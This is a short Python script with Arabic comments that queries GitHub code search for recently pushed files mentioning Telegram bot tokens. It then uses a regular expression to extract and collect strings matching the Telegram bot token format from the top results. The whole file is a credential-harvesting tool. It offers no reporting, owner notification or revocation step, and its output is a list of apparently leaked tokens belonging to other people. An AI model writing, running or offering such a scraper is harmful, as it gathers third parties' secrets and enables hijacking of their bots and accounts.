import re
import os
import datetime
from github import Github

def search_for_tokens():
    token = os.getenv('GITHUB_TOKEN')
    if not token:
        print("[!] GITHUB_TOKEN غير موجود في المتغيرات!")
        return []
        
    print("[*] بدء عملية مسح جديدة على GitHub...")
    g = Github(token)
    found_tokens = []
    
    # البحث في آخر 24 ساعة لضمان التقاط كل شيء
    day_ago = (datetime.datetime.utcnow() - datetime.timedelta(hours=24)).isoformat()
    
    queries = [
        f'bot_token pushed:>{day_ago}',
        f'telebot pushed:>{day_ago}',
        f'telegram_token pushed:>{day_ago}'
    ]
    
    for query in queries:
        print(f"[>] جاري تنفيذ استعلام البحث: {query}")
        try:
            results = g.search_code(query=query, sort='indexed', order='desc')
            
            # جلب أفضل 50 نتيجة لكل استعلام
            found_count = 0
            for file in results[:50]:
                try:
                    content = file.decoded_content.decode('utf-8')
                    matches = re.findall(r'[0-9]{8,15}:[a-zA-Z0-9_-]{35}', content)
                    
                    for token in matches:
                        if token not in found_tokens:
                            found_tokens.append(token)
                            found_count += 1
                except Exception:
                    continue
            print(f"[+] تم العثور على {found_count} توكن محتمل من استعلام: {query}")
            
        except Exception as e:
            print(f"[!] خطأ في استعلام {query}: {e}")
            
    print(f"[*] انتهت عملية المسح. إجمالي التوكنات الجديدة التي تم رصدها: {len(found_tokens)}")
    return found_tokens
